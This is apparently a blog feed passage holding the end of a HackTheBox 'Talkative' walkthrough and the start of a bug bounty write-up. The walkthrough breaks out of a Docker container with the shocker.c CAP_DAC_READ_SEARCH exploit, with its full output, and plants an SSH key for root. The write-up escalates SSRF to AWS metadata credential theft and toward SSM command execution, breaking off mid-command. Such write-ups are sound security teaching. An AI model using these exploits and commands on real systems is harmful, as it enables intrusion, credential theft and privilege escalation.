<code>CAP_DAC_READ_SEARCH</code> capability allows to bypass file read permission checks:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ man capabilities</span><br><span class="line">[...]</span><br><span class="line">CAP_DAC_READ_SEARCH</span><br><span class="line">    * Bypass file read permission checks and directory read</span><br><span class="line">      and execute permission checks;</span><br><span class="line">    * invoke open_by_handle_at(<span class="number">2</span>);</span><br><span class="line">    * use the linkat(<span class="number">2</span>) AT_EMPTY_PATH flag to create a link to</span><br><span class="line">      a file referred to by a file descriptor.</span><br></pre></td></tr></table></figure><p>Let’s see if we can exploit this capability to read the <code>/root/root.txt</code> flag from the host:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(remote) root@c150397ccd63:<span class="regexp">/root# ./</span>cdk run cap-dac-read-search /etc/hosts /root/root.txt</span><br><span class="line">Running <span class="keyword">with</span> target: <span class="regexp">/root/</span>root.txt, <span class="attr">ref</span>: <span class="regexp">/etc/</span>hosts</span><br><span class="line">08a6xxxxxxxxxxd971</span><br></pre></td></tr></table></figure><p>To see what happened behind the hood of <code>cdk</code> we can take a retrieve the original exploit used, named <code>[shocker.c](http://stealth.openwall.net/xSports/shocker.c)</code> . Reading through the source code to understand how it works.</p><p>By editing the exploit to our current situation we can also retrieve the flag:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sed -i <span class="string">&#x27;s/\/.dockerinit/\/etc\/hostname/g&#x27;</span> shocker.c</span><br><span class="line">[hg8@archbook ~]$ sed -i <span class="string">&#x27;s/\/etc\/shadow/\/root\/root.txt/g&#x27;</span> shocker.c</span><br><span class="line">[hg8@archbook ~]$ cc -Wall -std=c99 -O2 shocker.c -static -o shocker</span><br></pre></td></tr></table></figure><p>Then whiting the container:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">(remote) root@c150397ccd63:/root<span class="comment"># chmod +x shocker &amp;&amp; ./shocker</span></span><br><span class="line">[***] docker VMM-container breakout Po(C) <span class="number">2014</span>             [***]</span><br><span class="line">[*] Resolving <span class="string">&#x27;root/root.txt&#x27;</span></span><br><span class="line">[*] Found lib32</span><br><span class="line">[*] Found ..</span><br><span class="line">[*] Found lost+found</span><br><span class="line">[*] Found sbin</span><br><span class="line">[*] Found <span class="built_in">bin</span></span><br><span class="line">[*] Found boot</span><br><span class="line">[*] Found dev</span><br><span class="line">[*] Found run</span><br><span class="line">[*] Found lib64</span><br><span class="line">[*] Found .</span><br><span class="line">[*] Found var</span><br><span class="line">[*] Found home</span><br><span class="line">[*] Found media</span><br><span class="line">[*] Found proc</span><br><span class="line">[*] Found etc</span><br><span class="line">[*] Found lib</span><br><span class="line">[*] Found libx32</span><br><span class="line">[*] Found cdrom</span><br><span class="line">[*] Found root</span><br><span class="line">[+] Match: root ino=<span class="number">18</span></span><br><span class="line">[*] Brute forcing remaining 32bit. This can take a <span class="keyword">while</span>...</span><br><span class="line">[*] (root) Trying: <span class="number">0x00000000</span></span><br><span class="line">[*] <span class="comment">#=8, 1, char nh[] = &#123;0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00&#125;;</span></span><br><span class="line">[*] Resolving <span class="string">&#x27;root.txt&#x27;</span></span><br><span class="line">[*] Found ..</span><br><span class="line">[*] Found .backup</span><br><span class="line">[*] Found .config</span><br><span class="line">[*] Found .cache</span><br><span class="line">[*] Found .local</span><br><span class="line">[*] Found .ssh</span><br><span class="line">[*] Found .</span><br><span class="line">[*] Found .profile</span><br><span class="line">[*] Found .bashrc</span><br><span class="line">[*] Found root.txt</span><br><span class="line">[+] Match: root.txt ino=<span class="number">110097</span></span><br><span class="line">[*] Brute forcing remaining 32bit. This can take a <span class="keyword">while</span>...</span><br><span class="line">[*] (root.txt) Trying: <span class="number">0x00000000</span></span><br><span class="line">[*] <span class="comment">#=8, 1, char nh[] = &#123;0x11, 0xae, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00&#125;;</span></span><br><span class="line">[!] Got a final handle!</span><br><span class="line">[*] <span class="comment">#=8, 1, char nh[] = &#123;0x11, 0xae, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00&#125;;</span></span><br><span class="line">[!] Win! /root/root.txt output follows:</span><br><span class="line">08a6xxxxxxxxxxd971</span><br></pre></td></tr></table></figure><h3 id="Arbitrary-file-read-→-Root-Shell"><a href="#Arbitrary-file-read-→-Root-Shell" class="headerlink" title="Arbitrary file read → Root Shell"></a>Arbitrary file read → Root Shell</h3><p>Well arbitrary file read are cool but can we say we finished the box without a proper shell ?<br>While researching a bit more on the <code>shocker.c</code> exploit I stumble upon a variant exploit <code>[exploit_dac-read-search_dac-override.c](https://github.com/akusec/Docker_Exploits/blob/main/Capabilities/DAC_READ_SEARCH/exploit_dac-read-search_dac-override.c)</code> using <code>CAP_DAC_OVERRIDE</code> capability to write arbitrary file.</p><p><em>Note: <code>DAC_OVERRIDE</code> is activated by default on containers but alone it’s not a risk for container breakout.</em></p><p>Let’s build the exploit to add our SSH key to the <code>root</code> account <code>authorized_keys</code> file.</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https:<span class="comment">//raw.githubusercontent.com/akusec/Docker_Exploits/main/Capabilities/DAC_READ_SEARCH/exploit_dac-read-search_dac-override.c</span></span><br><span class="line">[hg8@archbook ~]$ cc -Wall -std=c99 -O2 exploit_dac-read-search_dac-override.c -<span class="keyword">static</span> -o shocker_write</span><br></pre></td></tr></table></figure><p> Then in our container:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">(remote) root@c150397ccd63:/tmp# cat authorized_keys</span><br><span class="line">ssh-ed25519 AAAAC3NzxxxxxxiC hg8@talkative.htb</span><br><span class="line">(remote) root@c150397ccd63:<span class="regexp">/tmp# ./</span>shocker_write /root/.ssh/authorized_keys authorized_keys</span><br><span class="line">[*] Resolving <span class="string">&#x27;root/.ssh/authorized_keys&#x27;</span></span><br><span class="line">[*] Found lib32</span><br><span class="line">[*] Found ..</span><br><span class="line">[*] Found lost+found</span><br><span class="line">[*] Found sbin</span><br><span class="line">[*] Found bin</span><br><span class="line">[*] Found boot</span><br><span class="line">[*] Found dev</span><br><span class="line">[*] Found run</span><br><span class="line">[*] Found lib64</span><br><span class="line">[*] Found .</span><br><span class="line">[*] Found <span class="keyword">var</span></span><br><span class="line">[*] Found home</span><br><span class="line">[*] Found media</span><br><span class="line">[*] Found proc</span><br><span class="line">[*] Found etc</span><br><span class="line">[*] Found lib</span><br><span class="line">[*] Found libx32</span><br><span class="line">[*] Found cdrom</span><br><span class="line">[*] Found root</span><br><span class="line">[+] Match: root ino=<span class="number">18</span></span><br><span class="line">[*] Brute forcing remaining 32bit. This can take a <span class="keyword">while</span>...</span><br><span class="line">[*] (root) Trying: <span class="number">0x00000000</span></span><br><span class="line">[*] #=<span class="number">8</span>, <span class="number">1</span>, char nh[] = &#123;<span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">[*] Resolving <span class="string">&#x27;.ssh/authorized_keys&#x27;</span></span><br><span class="line">[*] Found ..</span><br><span class="line">[*] Found .backup</span><br><span class="line">[*] Found .config</span><br><span class="line">[*] Found .cache</span><br><span class="line">[*] Found .local</span><br><span class="line">[*] Found .ssh</span><br><span class="line">[+] Match: .ssh ino=<span class="number">9718</span></span><br><span class="line">[*] Brute forcing remaining 32bit. This can take a <span class="keyword">while</span>...</span><br><span class="line">[*] (.ssh) Trying: <span class="number">0x00000000</span></span><br><span class="line">[*] #=<span class="number">8</span>, <span class="number">1</span>, char nh[] = &#123;<span class="number">0xf6</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">[*] Resolving <span class="string">&#x27;authorized_keys&#x27;</span></span><br><span class="line">[*] Found ..</span><br><span class="line">[*] Found id_rsa.pub</span><br><span class="line">[*] Found .</span><br><span class="line">[*] Found known_hosts</span><br><span class="line">[*] Found authorized_keys</span><br><span class="line">[+] Match: authorized_keys ino=<span class="number">9720</span></span><br><span class="line">[*] Brute forcing remaining 32bit. This can take a <span class="keyword">while</span>...</span><br><span class="line">[*] (authorized_keys) Trying: <span class="number">0x00000000</span></span><br><span class="line">[*] #=<span class="number">8</span>, <span class="number">1</span>, char nh[] = &#123;<span class="number">0xf8</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">[!] Got a final handle!</span><br><span class="line">[*] #=<span class="number">8</span>, <span class="number">1</span>, char nh[] = &#123;<span class="number">0xf8</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">Success!!</span><br></pre></td></tr></table></figure><p>The file successfully got written. Let’s now go back to the Bolt CMS container shell (only container to have SSH access to the main server) and connect using our newly added SSH key:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(remote) www-data@8ad3cb438f7e:/tmp$ chmod <span class="number">600</span> id_ed25519_hg8</span><br><span class="line">(remote) www-data@8ad3cb438f7e:/tmp$ ssh root@<span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span> -i id_ed25519_hg8</span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="string">&#x27;172.18.0.1 (172.18.0.1)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:kUPIZ6IPcxq7Mei4nUzQI3JakxPUtkTlEejtabx4wnY.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Fri Apr 29 18:57:57 2022 from 10.129.111.185</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@talkative:~# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string">root@talkative:~# cat root.txt</span></span><br><span class="line"><span class="string">adbxxxxxxxxxxxxxxx14a</span></span><br></pre></td></tr></table></figure><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://github.com/CsEnox/CVE-2021-22911">CVE-2021-22911: Pre-Auth Blind NoSQL Injection leading to Remote Code Execution in Rocket Chat 3.12.1</a></li><li><a href="http://stealth.openwall.net/xSports/shocker.c">shocker.c: docker PoC VMM-container breakout</a></li><li><a href="https://github.com/akusec/Docker_Exploits/blob/main/Capabilities/DAC_READ_SEARCH/exploit_dac-read-search_dac-override.c">exploit_dac-read-search_dac-override.c: Shocker exploit + overwrite</a></li><li><a href="https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3">Docker breakout exploit analysis</a>.</li></ul><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedback!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Hard Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> docker </tag>
            
            <tag> mongodb </tag>
            
            <tag> Linux </tag>
            
            <tag> container </tag>
            
            <tag> CVE </tag>
            
            <tag> recon </tag>
            
            <tag> jamovi </tag>
            
            <tag> rocket.chat </tag>
            
            <tag> pwncat </tag>
            
            <tag> bolt </tag>
            
            <tag> cap-dac-read-search </tag>
            
            <tag> shocker </tag>
            
            <tag> webhook </tag>
            
            <tag> twig </tag>
            
            <tag> ssti </tag>
            
            <tag> r-lang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bug Bounty Story: Escalating SSRF to RCE on AWS</title>
      <link href="/posts/bugbounty/ssrf-to-rce-aws/"/>
      <url>/posts/bugbounty/ssrf-to-rce-aws/</url>
      
        <content type="html"><![CDATA[<p>Hey everyone, not a CTF write-up today but my first Bug Bounty Bounty story: SSRF escalation to RCE on AWS.</p><p>The vulnerability was initially reported on the 20th of July 2021, rewarded as a valid finding on the 22th of July, and patched by the 1st of August. The communication with the company was really good, a patch was rolled out quickly and after a few bypass fixes, it got completely resolved and bounty got granted.</p><p>Discovery was made on a private bug bounty program so the company name has been redacted.</p><p>In this post I will get into details on how the vulnerability was discovered in order to show the research process. Hopefully this will come useful if you are new to the bug bounty world.</p><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>While doing the usual recon phase (the same done for CTF basically) on the company subdomains, an interesting <code>proxify</code> endpoint pops up. We can guess it’s used to proxy something.</p><p><img src="https://user-images.githubusercontent.com/9076747/180664582-999e12da-360f-4a7e-817d-df831d84d9e5.png" alt="gobuster proxify endpoint"></p><p>The endpoint is publicly accessible when setting up the referrer used to navigate the application. When calling the endpoint directly we got informed it require an URL to be provided:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; curl --referer &lt;redacted&gt; https://&lt;redacted&gt;/proxify/ -i</span><br><span class="line"><span class="meta">HTTP/2</span> <span class="number">400</span></span><br><span class="line"><span class="attribute">date</span><span class="punctuation">: </span>Tue, 20 Jul 2021 10:26:20 GMT</span><br><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">content-length</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">cache-control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">vary</span><span class="punctuation">: </span>accept-encoding</span><br><span class="line"></span><br><span class="line"><span class="lasso">Need <span class="keyword">to</span> <span class="keyword">provide</span> url%</span></span><br><span class="line"><span class="lasso"></span></span><br></pre></td></tr></table></figure><p>Let’s try to add an url as GET parameter: </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt; curl --referer &lt;redacted&gt; &quot;https://&lt;redacted&gt;/proxify/?url=https://example.com&quot; -i</span><br><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> </span><br><span class="line"><span class="attribute">date</span><span class="punctuation">: </span>Sun, 20 Jul 2021 10:26:58 GMT</span><br><span class="line"><span class="attribute">server</span><span class="punctuation">: </span>ECS (dcb/7F3B)</span><br><span class="line"><span class="attribute">vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">vary</span><span class="punctuation">: </span>Accept-Encoding,accept-encoding</span><br><span class="line"><span class="attribute">via</span><span class="punctuation">: </span>&lt;redacted&gt;</span><br><span class="line"><span class="attribute">x-cache</span><span class="punctuation">: </span>HIT</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Example Domain<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">(...)</span></span><br><span class="line"><span class="xml"></span></span><br></pre></td></tr></table></figure><p>Having a service making HTTP requests for a user’s chosen URL is risky and if not properly handled can lead to a Server Side Request Forgery vulnerability.</p><blockquote><p>Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location.<br>In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization’s infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials.<br><a href="https://portswigger.net/web-security/ssrf">https://portswigger.net/web-security/ssrf</a></p></blockquote><p>It’s possible to verify that the service is vulnerable to SSRF by inputting an URL we have control over. To do so we can use <code>interact.sh</code>, an <a href="https://github.com/projectdiscovery/interactsh">open source</a> out of band interaction gathering server (a free alternative to Burp Collaborator).</p><p>First we open our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; interactsh-client</span><br><span class="line">    _       __                       __       __  </span><br><span class="line">   (_)___  / /____  _________ ______/ /______/ /_ </span><br><span class="line">  / / __ \/ __/ _ \/ ___/ __ <span class="string">&#x27;/ ___/ __/ ___/ __ \</span></span><br><span class="line"><span class="string"> / / / / / /_/  __/ /  / /_/ / /__/ /_(__  ) / / /</span></span><br><span class="line"><span class="string">/_/_/ /_/\__/\___/_/   \__,_/\___/\__/____/_/ /_/ v0.0.3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">             projectdiscovery.io</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[INF] Listing 1 payload for OOB Testing</span></span><br><span class="line"><span class="string">[INF] abcdefghijklmnopkrstuvwxyz.interact.sh</span></span><br></pre></td></tr></table></figure><p>Then we use the generated URL on the <code>proxify/</code> endpoint:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; curl --referer &lt;redacted&gt; &quot;https://&lt;redacted&gt;/proxify/?url=https://abcdefghijklmnopkrstuvwxyz.interact.sh&quot; -i</span><br><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> </span><br><span class="line"><span class="attribute">date</span><span class="punctuation">: </span>Sun, 20 Jul 2021 10:27:52 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>interact.sh</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>72</span><br><span class="line"><span class="attribute">via</span><span class="punctuation">: </span>&lt;redacted&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>abcdefghijklmnopkrstuvwxyz<span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>Once the request done, <a href="https://intereact.sh/"><code>intereact.sh</code></a> immediately received an HTTP request coming from the application server, confirming the SSRF vulnerability:</p><p><img src="https://user-images.githubusercontent.com/9076747/180665565-93b7af23-0152-4ec4-b958-2061e65d3a78.png" alt="interact.sh output SSRF"></p><h2 id="SSRF-To-AWS-Credentials-Disclosure"><a href="#SSRF-To-AWS-Credentials-Disclosure" class="headerlink" title="SSRF To AWS Credentials Disclosure"></a>SSRF To AWS Credentials Disclosure</h2><p>With our bug bounty hunter eyes (or with Google) we can recognize that the caller IP shown by <a href="http://interact.sh/"><code>interact.sh</code></a> belongs to AWS. Knowing this we can try to connect AWS Private IP to disclose metadata.</p><p>AWS EC2 Instances have access to a metadata service at <code>169.254.169.254</code>. This service returns a lot of information about the instance such as its IP address, the application tokens, the security group name, etc. Depending on the configuration we can also find IAM credentials to authenticate as this role. If IMDS version 1 is used, SSRF can be used to steal those information and credentials. </p><p>Let’s first try to retrieve security credentials (<code>https://169.254.169.254/latest/meta-data/iam/security-credentials/</code>). </p><p>Unfortunately we get hit by the following error:</p><blockquote><p>URL parameter can not be a private URL</p></blockquote><p>But, after a few trial and error, we found that dropping the <code>http</code> scheme allows to bypass the restriction:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; curl --referer &lt;redacted&gt; &quot;https://&lt;redacted&gt;/proxify/?url=169.254.169.254/latest/meta-data/iam/security-credentials/&quot; -i</span><br><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span></span><br><span class="line"><span class="attribute">date</span><span class="punctuation">: </span>Tue, 20 Jul 2021 10:34:00 GMT</span><br><span class="line"><span class="attribute">content-length</span><span class="punctuation">: </span>20</span><br><span class="line"><span class="attribute">server</span><span class="punctuation">: </span>EC2ws</span><br><span class="line"><span class="attribute">via</span><span class="punctuation">: </span>&lt;redacted&gt;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">ec2-<span class="keyword">default</span>-ssm</span></span><br></pre></td></tr></table></figure><p>Once we have retrieved the role name we can retrieve all credentials:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt; curl --referer &lt;redacted&gt; &quot;https://&lt;redacted&gt;/proxify/?url=169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm&quot; -i</span><br><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span></span><br><span class="line"><span class="attribute">date</span><span class="punctuation">: </span>Tue, 20 Jul 2021 10:36:50 GMT</span><br><span class="line"><span class="attribute">content-length</span><span class="punctuation">: </span>1337</span><br><span class="line"><span class="attribute">server</span><span class="punctuation">: </span>EC2ws</span><br><span class="line"><span class="attribute">via</span><span class="punctuation">: </span>&lt;redacted&gt;</span><br><span class="line"></span><br><span class="line"><span class="ada">&#123;</span></span><br><span class="line"><span class="ada">  <span class="string">&quot;Code&quot;</span> : &quot;<span class="type">Success</span><span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="ada">  &quot;</span>LastUpdated<span class="string">&quot; : &quot;</span><span class="number">2021</span>-<span class="number">07</span>-<span class="number">20</span>T09:<span class="number">03</span>:<span class="number">23</span>Z<span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="ada">  &quot;</span><span class="keyword">Type</span><span class="string">&quot; : &quot;</span>AWS-HMAC<span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="ada">  &quot;</span>AccessKeyId<span class="string">&quot; : &quot;</span>&lt;redacted&gt;<span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="ada">  &quot;</span>SecretAccessKey<span class="string">&quot; : &quot;</span>&lt;redacted&gt;<span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="ada">  &quot;</span>Token<span class="string">&quot; : &quot;</span>&lt;redacted&gt;<span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="ada">  &quot;</span>Expiration<span class="string">&quot; : &quot;</span><span class="number">2021</span>-<span class="number">07</span>-<span class="number">20</span>T16:<span class="number">10</span>:<span class="number">48</span>Z<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="ada">&#125;%</span></span></span><br><span class="line"><span class="string"><span class="ada"></span></span></span><br></pre></td></tr></table></figure><p>Bingo. These credentials can then be used with AWS CLI to make API calls as the IAM role.</p><p>Let’s import the profile with AWS CLI to continue our enumeration and see if we can escalate our privileges:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; aws configure --profile bugbounty</span><br><span class="line">AWS Access Key ID [None]: &lt;redacted&gt;</span><br><span class="line">AWS Secret Access Key [None]: &lt;redacted&gt;</span><br><span class="line">Default region name [None]: eu-west-1</span><br><span class="line">Default output format [None]: json</span><br></pre></td></tr></table></figure><p>This allows us to retrieve the account ID:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; aws sts get-caller-identity</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;UserId&quot;</span>: <span class="string">&quot;&lt;redacted&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Account&quot;</span>: <span class="string">&quot;&lt;redacted&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Arn&quot;</span>: <span class="string">&quot;&lt;redacted&gt;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Remote-Code-Execution"><a href="#Remote-Code-Execution" class="headerlink" title="Remote Code Execution"></a>Remote Code Execution</h2><h3 id="via-send-command"><a href="#via-send-command" class="headerlink" title="via send-command"></a>via send-command</h3><p>From here the best case scenario for us would be to achieve remote code execution on the EC2 instance.</p><p>The easiest way is by listing instances for which security credential is accepted for executing commands.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; aws ssm describe-instance-information --output text --query <span class="string">&quot;InstanceInformationList[*]&quot;</span></span><br><span class="line">&lt;redacted&gt;</span><br></pre></td></tr></table></figure><p>Unfortunately the role is not authorized to perform <code>send-command</code>. Otherwise we could have used the following  command to gain RCE:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; aws ssm send-command --document-name <span class="string">&quot;AWS-RunShellScript&quot;</span> --comment <span class="string">&quot;RCE&quot;</span> --targets <span class="string">&quot;Key=instanceids,Values=[instanceid]&quot;</span> --parameters <span class="string">&#x27;commands=curl 